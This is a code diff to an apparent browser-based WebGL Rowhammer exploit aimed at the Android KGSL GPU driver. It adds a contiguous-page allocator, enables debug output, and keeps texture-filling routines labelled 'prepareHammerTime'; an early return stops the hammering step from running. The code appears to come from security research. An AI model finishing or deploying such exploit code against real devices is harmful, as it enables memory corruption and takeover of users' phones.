@@ -1,21 +1,33 @@
 /**
 * Entry point of the exploit
+* TODO: optimize the python server to ignore previous kgsl entries
 */
 async function glitch() {
     // create gl context
     initGL();
+
+    const allocationPages = 256 * 128
+    // const allocationPages = 8
+    let allocator = new Allocator(allocationPages)
+    await allocator._init(0)
+    
+    await sleep(1000)
+    contPages = allocator.SearchContPages()
+    console.log(`++ ${contPages.length} continuous pages found`)
+
+    allocator.clean()
+    return 
     initFramebuffer();
     
     // enable shaders too be used
     shader = new Shader('vertex-shader', 'fragment-shader');
     shader.use();
 
-
     // create debug requirements
-    // initDebug();
+    initDebug();
     prepareHammerTime();
     gl.drawArrays(gl.TRIANGLES, 0, 6);
-    // viewFramebuffer();
+    viewFramebuffer();
 }
 
 function prepareHammerTime() {
@@ -25,7 +37,6 @@ function prepareHammerTime() {
         const t = createTexture2DRGBA(createUint8Array(KB4, 20+i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
         textures.push(t);
     }
-
 
     fillTexture(textures[0], 0x00);
     fillTexture(textures[1], 0xFF);
@@ -54,14 +65,6 @@ async function testAllocator() {
     let allocator = new Allocator(allocationPages)
     await allocator._init(0)
 
-    // for (let i = 0; i < allocationPages; i++) {
-    //     if (allocator.newKGSL[1].tex_id === safeAllocator.newKGSLSafe[1]) {
-    //         console.info(`page ${i} checked`)
-    //     }
-    //     else {
-    //         console.error(`page ${i} failed`)
-    //     }
-    // }
     console.log(allocator.newKGSL)
     console.log(allocator.newKGSLSafe)
     allocator.clean()
